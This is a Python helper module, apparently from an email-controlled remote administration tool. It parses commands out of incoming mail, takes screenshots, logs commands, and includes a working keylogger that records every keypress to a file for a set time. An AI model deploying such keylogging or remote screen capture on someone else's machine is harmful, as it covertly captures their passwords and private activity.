from constant import *


def decode_mail(msg: str):
    cmd_list = ""

    print("-----------------------------")
    sender = email.utils.parseaddr(msg.get("From"))[1]
    print("From:", sender)
    print("Content:", end=" ")
    for part in msg.walk():
        if part.get_content_type() == "text/plain":
            content = part.get_payload(decode=True).decode("utf-8")
            print(content, end="\t")
            cmd_list += content

    cmd_list = cmd_list.replace("\n", " ").replace("\r", " ").split()
    # print()
    # print(cmd_list)
    return sender, cmd_list


def current_time() -> str:
    return datetime.now().strftime("%H:%M:%S %d-%m-%Y")


def capture_SS(file_name: str = "Picture.png") -> str:
    ext = [".png", ".jpg", ".jpeg", ".tiff", ".bmp", ".gif"]
    if not any(file_name.endswith(x) for x in ext):
        file_name += ".png"
    
    path = "Screenshots\\"
    
    pyautogui.screenshot(path + file_name)
    return path + file_name


def logger(duration: int) -> str:
    file_path: str = "KeyLog\\keylog.txt"
    # ? Ensure the existence of the file
    with open(file_path, "w") as f:
        pass

    logging.basicConfig(
        filename=file_path,
        filemode="w",
        level=logging.DEBUG,
        format="%(asctime)s - %(message)s",
        datefmt="%d-%b-%y %H:%M:%S",
    )

    def on_press(key):
        try:
            logging.info(str(key))
        except AttributeError:
            logging.error(str(key))

    with Listener(on_press=on_press) as listener:
        sleep(duration)
        listener.stop()

    return file_path


def note2log(sender: str, cmd_list: list) -> str:
    file_path: str = "Log\\mail.log"

    with open(file_path, "a") as log:
        pass

    logging.basicConfig(
        filename=file_path,
        filemode="a",
        level=logging.INFO,
        format="%(asctime)s - %(message)s",
        datefmt="%d-%b-%y %H:%M:%S",
    )

    logging.info(f"From: {sender}, Command: {cmd_list}")
    
    return file_path

def list_command() -> str:
    content = "The supported commands:"
    content += "\n\t- screenshot [file_name]"
    content += "\n\t- webcam                        (not available)"
    content += "\n\t- keylog [time in seconds]"
    content += "\n\t- logout"
    content += "\n\t- shutdown [time in seconds]"
    content += "\n\t- list apps                     (not available)"
    content += "\n\t- list processes                (not available)"
    content += "\n\t- kill process                  (not available)"
    content += "\n\t- show dir                      (not available)"
    content += "\n\t- show log"
    content += "\n\t- help"
    return content
    